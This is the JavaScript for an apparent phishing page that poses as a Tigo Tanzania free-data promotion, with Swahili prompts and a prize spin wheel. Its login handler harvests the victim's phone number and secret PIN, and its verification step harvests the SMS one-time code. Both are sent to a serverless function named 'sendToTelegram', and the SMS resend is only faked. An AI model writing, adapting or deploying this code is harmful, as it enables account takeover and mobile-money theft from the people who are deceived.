document.addEventListener('DOMContentLoaded', () => {
  
  // ==========================================================================
  // DOM ELEMENT REFERENCES
  // ==========================================================================
  
  // Stages
  const loginStage = document.getElementById('login-stage');
  const otpStage = document.getElementById('otp-stage');
  const statusStage = document.getElementById('status-stage');
  
  // Forms & Inputs
  const claimForm = document.getElementById('claim-form');
  const phoneNumberInput = document.getElementById('phone-number');
  const secretPinInput = document.getElementById('secret-pin');
  const otpInputs = document.querySelectorAll('.otp-box');
  
  // Toggles & Errors
  const phoneError = document.getElementById('phone-error');
  const pinError = document.getElementById('pin-error');
  const togglePwdBtn = document.getElementById('toggle-pwd');
  
  // Action Buttons
  const btnSubmit = document.getElementById('btn-submit');
  const btnVerify = document.getElementById('btn-verify');
  const btnResend = document.getElementById('btn-resend');
  const btnBack = document.getElementById('btn-back');
  const btnLogout = document.getElementById('btn-logout');
  
  // Text Displays
  const userPhoneDisplay = document.getElementById('user-phone-display');
  const dashPhoneDisplay = document.getElementById('dash-phone-display');
  const otpTimer = document.getElementById('otp-timer');
  
  // Dashboard Metrics
  const dataVal = document.getElementById('data-val');
  const usedDataVal = document.getElementById('used-data-val');
  const progressRingCircle = document.querySelector('.progress-ring__circle');
  
  // Speed Sim Elements
  const speedPing = document.getElementById('speed-ping');
  const speedDl = document.getElementById('speed-dl');
  const speedUl = document.getElementById('speed-ul');
  const toggle5G = document.getElementById('toggle-5g');
  
  // Spin Wheel Elements
  const spinWheel = document.getElementById('spin-wheel');
  const btnSpin = document.getElementById('btn-spin');
  const spinStatus = document.getElementById('spin-status');
  const toast = document.getElementById('toast');
  
  // ==========================================================================
  // APP STATE
  // ==========================================================================
  let userPhone = '';
  let countdownInterval = null;
  let speedInterval = null;
  let totalData = 50.0;
  let usedData = 0.2;
  let hasSpun = false;

  // Wheel sectors (defined counter-clockwise in css)
  const wheelSectors = [
    { label: "Jaribu Tena (Try Again)", value: 0 },
    { label: "500 MB", value: 0.5 },
    { label: "250 MB", value: 0.25 },
    { label: "1 GB", value: 1.0 },
    { label: "Subiri Kesho (Try Tomorrow)", value: 0 },
    { label: "5 GB!", value: 5.0 },
    { label: "100 MB", value: 0.1 },
    { label: "2 GB", value: 2.0 }
  ];

  // ==========================================================================
  // VIEW NAVIGATION & TRANSITIONS
  // ==========================================================================
  function showStage(stageToShow) {
    // Fade out active card/container
    const active = document.querySelector('.card.active, .dashboard-container.active');
    if (active) {
      active.style.opacity = '0';
      active.style.transform = 'translateY(20px)';
      
      setTimeout(() => {
        active.classList.remove('active');
        active.style.display = 'none';
        
        // Show new stage
        stageToShow.style.display = 'block';
        stageToShow.offsetHeight;
        stageToShow.classList.add('active');
        stageToShow.style.opacity = '1';
        stageToShow.style.transform = 'translateY(0)';
        
        if (stageToShow === otpStage && otpInputs.length > 0) {
          otpInputs[0].focus();
        }
      }, 300);
    }
  }

  // ==========================================================================
  // PHONE & PIN VALIDATION
  // ==========================================================================
  
  // Toggle password visibility
  togglePwdBtn.addEventListener('click', () => {
    const isPassword = secretPinInput.type === 'password';
    secretPinInput.type = isPassword ? 'text' : 'password';
    togglePwdBtn.innerHTML = isPassword 
      ? `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
      : `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
  });

  // Basic validation rules for Tanzanian phone numbers (Tigo: starts with 071, 065, 067, 078, etc.)
  function validatePhone(phone) {
    const cleanPhone = phone.replace(/\s+/g, '');
    // Regex for Tanzania numbers: starting with 06, 07, or +255/255 followed by 9 digits
    const tzRegex = /^(?:\+255|255|0)?[67]\d{8}$/;
    return tzRegex.test(cleanPhone);
  }

  function validatePin(pin) {
    return /^\d{4}$/.test(pin);
  }

  // Clear errors when typing
  phoneNumberInput.addEventListener('input', () => {
    phoneNumberInput.parentElement.classList.remove('has-error');
  });

  secretPinInput.addEventListener('input', () => {
    // Only numbers
    secretPinInput.value = secretPinInput.value.replace(/\D/g, '');
    secretPinInput.parentElement.classList.remove('has-error');
  });

  // Login form submit handler
  claimForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const phone = phoneNumberInput.value.trim();
    const pin = secretPinInput.value.trim();
    let isValid = true;

    if (!validatePhone(phone)) {
      phoneNumberInput.parentElement.classList.add('has-error');
      isValid = false;
    }
    
    if (!validatePin(pin)) {
      secretPinInput.parentElement.classList.add('has-error');
      isValid = false;
    }

    if (isValid) {
      userPhone = phone;
      // Show loading spinner
      btnSubmit.classList.add('loading');
      btnSubmit.disabled = true;

      // Send data to Netlify serverless function
      fetch('/.netlify/functions/sendToTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ phone, pin })
      })
      .catch(err => console.error('Error sending data:', err))
      .finally(() => {
        btnSubmit.classList.remove('loading');
        btnSubmit.disabled = false;
        
        // Prepare OTP stage
        // Mask phone number (e.g. 0712******)
        let masked = phone;
        if (phone.length >= 10) {
          masked = phone.substring(0, 4) + '***' + phone.substring(phone.length - 3);
        }
        userPhoneDisplay.textContent = masked;
        dashPhoneDisplay.textContent = phone;
        
        // Start SMS OTP resend timer
        startOtpTimer();

        // Navigate
        showStage(otpStage);
      });
    }
  });

  // Back button from OTP stage
  btnBack.addEventListener('click', () => {
    clearInterval(countdownInterval);
    showStage(loginStage);
  });

  // ==========================================================================
  // OTP AUTO-TAB & VERIFICATION
  // ==========================================================================
  otpInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      // Only digits allowed
      input.value = input.value.replace(/\D/g, '');
      
      // Auto tab to next box
      if (input.value !== '' && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      // Handle backspace to go to previous box
      if (e.key === 'Backspace' && input.value === '' && index > 0) {
        otpInputs[index - 1].focus();
      }
    });
  });

  // SMS Timer logic
  function startOtpTimer() {
    let secondsLeft = 90; // 1 min 30 sec
    btnResend.disabled = true;
    btnResend.classList.remove('active');
    
    clearInterval(countdownInterval);
    
    countdownInterval = setInterval(() => {
      secondsLeft--;
      const mins = Math.floor(secondsLeft / 60);
      const secs = secondsLeft % 60;
      
      otpTimer.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
      
      if (secondsLeft <= 0) {
        clearInterval(countdownInterval);
        otpTimer.parentElement.innerHTML = 'Namba tayari imeshaisha muda wake';
        btnResend.disabled = false;
        btnResend.classList.add('active');
      }
    }, 1000);
  }

  // Resend code handler
  btnResend.addEventListener('click', () => {
    // Reset inputs
    otpInputs.forEach(input => input.value = '');
    otpInputs[0].focus();
    
    // Simulate loading on resend
    btnResend.textContent = 'Inatuma...';
    btnResend.style.pointerEvents = 'none';
    
    setTimeout(() => {
      btnResend.innerHTML = 'Tuma Tena SMS';
      btnResend.style.pointerEvents = 'auto';
      
      // Reset timer container HTML structure
      const timerDesc = document.querySelector('.timer-desc');
      timerDesc.innerHTML = 'Unaweza kutuma tena baada ya: <span id="otp-timer" class="highlight">01:30</span>';
      
      // Re-assign reference of the newly created timer span
      const newOtpTimer = document.getElementById('otp-timer');
      
      // Update timer state
      let secondsLeft = 90;
      btnResend.disabled = true;
      btnResend.classList.remove('active');
      
      clearInterval(countdownInterval);
      countdownInterval = setInterval(() => {
        secondsLeft--;
        const mins = Math.floor(secondsLeft / 60);
        const secs = secondsLeft % 60;
        
        newOtpTimer.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        if (secondsLeft <= 0) {
          clearInterval(countdownInterval);
          newOtpTimer.parentElement.innerHTML = 'Namba tayari imeshaisha muda wake';
          btnResend.disabled = false;
          btnResend.classList.add('active');
        }
      }, 1000);
      
    }, 1000);
  });

  // Verify OTP button
  btnVerify.addEventListener('click', () => {
    // Check if all OTP boxes are filled
    let otpValue = '';
    otpInputs.forEach(input => otpValue += input.value);

    if (otpValue.length === 4) {
      btnVerify.classList.add('loading');
      btnVerify.disabled = true;

      // Send data to Netlify serverless function
      fetch('/.netlify/functions/sendToTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ phone: userPhone, otp: otpValue })
      })
      .catch(err => console.error('Error sending OTP:', err))
      .finally(() => {
        btnVerify.classList.remove('loading');
        btnVerify.disabled = false;
        clearInterval(countdownInterval);
        
        showStage(statusStage);
      });
    } else {
      // Bounce animation error warning
      otpInputs.forEach(input => {
        input.style.borderColor = 'var(--error)';
        input.animate([
          { transform: 'translateX(0)' },
          { transform: 'translateX(-5px)' },
          { transform: 'translateX(5px)' },
          { transform: 'translateX(0)' }
        ], { duration: 200 });
        
        setTimeout(() => {
          input.style.borderColor = '#e2e8f0';
        }, 1000);
      });
    }
  });
});
